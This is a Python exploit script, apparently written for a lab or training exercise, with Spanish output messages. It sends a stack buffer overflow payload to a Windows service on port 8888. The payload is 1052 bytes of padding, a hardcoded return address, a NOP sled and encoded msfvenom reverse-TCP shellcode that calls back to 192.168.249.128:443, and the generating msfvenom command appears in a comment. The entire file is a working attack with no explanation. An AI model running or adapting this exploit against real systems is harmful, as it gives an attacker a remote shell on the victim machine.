from pwn import *
from struct import pack
import socket, sys

if len(sys.argv) < 2:
    print ("Uso python" + sys.argv[0] + "<ip-address>\n")

ip_address = sys.argv[1]
rport = 8888

if __name__ == '__main__':
    
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.249.128 EXITFUNC=thread LPORT=443 -a x86 --platform windows  -e x86/shikata_ga_nai -f c
    shell_code = (b"\xda\xdc\xbe\x17\x27\x48\x8a\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
b"\x52\x31\x70\x17\x03\x70\x17\x83\xff\xdb\xaa\x7f\x03\xcb\xa9"
b"\x80\xfb\x0c\xce\x09\x1e\x3d\xce\x6e\x6b\x6e\xfe\xe5\x39\x83"
b"\x75\xab\xa9\x10\xfb\x64\xde\x91\xb6\x52\xd1\x22\xea\xa7\x70"
b"\xa1\xf1\xfb\x52\x98\x39\x0e\x93\xdd\x24\xe3\xc1\xb6\x23\x56"
b"\xf5\xb3\x7e\x6b\x7e\x8f\x6f\xeb\x63\x58\x91\xda\x32\xd2\xc8"
b"\xfc\xb5\x37\x61\xb5\xad\x54\x4c\x0f\x46\xae\x3a\x8e\x8e\xfe"
b"\xc3\x3d\xef\xce\x31\x3f\x28\xe8\xa9\x4a\x40\x0a\x57\x4d\x97"
b"\x70\x83\xd8\x03\xd2\x40\x7a\xef\xe2\x85\x1d\x64\xe8\x62\x69"
b"\x22\xed\x75\xbe\x59\x09\xfd\x41\x8d\x9b\x45\x66\x09\xc7\x1e"
b"\x07\x08\xad\xf1\x38\x4a\x0e\xad\x9c\x01\xa3\xba\xac\x48\xac"
b"\x0f\x9d\x72\x2c\x18\x96\x01\x1e\x87\x0c\x8d\x12\x40\x8b\x4a"
b"\x54\x7b\x6b\xc4\xab\x84\x8c\xcd\x6f\xd0\xdc\x65\x59\x59\xb7"
b"\x75\x66\x8c\x18\x25\xc8\x7f\xd9\x95\xa8\x2f\xb1\xff\x26\x0f"
b"\xa1\x00\xed\x38\x48\xfb\x66\x87\x25\xfa\xf7\x6f\x34\xfc\xe5"
b"\x49\xb1\x1a\x63\x86\x97\xb5\x1c\x3f\xb2\x4d\xbc\xc0\x68\x28"
b"\xfe\x4b\x9f\xcd\xb1\xbb\xea\xdd\x26\x4c\xa1\xbf\xe1\x53\x1f"
b"\xd7\x6e\xc1\xc4\x27\xf8\xfa\x52\x70\xad\xcd\xaa\x14\x43\x77"
b"\x05\x0a\x9e\xe1\x6e\x8e\x45\xd2\x71\x0f\x0b\x6e\x56\x1f\xd5"
b"\x6f\xd2\x4b\x89\x39\x8c\x25\x6f\x90\x7e\x9f\x39\x4f\x29\x77"
b"\xbf\xa3\xea\x01\xc0\xe9\x9c\xed\x71\x44\xd9\x12\xbd\x00\xed"
b"\x6b\xa3\xb0\x12\xa6\x67\xd0\xf0\x62\x92\x79\xad\xe7\x1f\xe4"
b"\x4e\xd2\x5c\x11\xcd\xd6\x1c\xe6\xcd\x93\x19\xa2\x49\x48\x50"
b"\xbb\x3f\x6e\xc7\xbc\x15")
 
    esp = b"\x17\x91\x61\x6d" #6d619117
    nops = b"\x90"*16
    buffer = b"A"*1052 + esp + nops + shell_code

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        s.send(buffer)
    
        s.close()
    
    except:
        print("\n[!] Se ha producido un error")
        sys.exit(1)


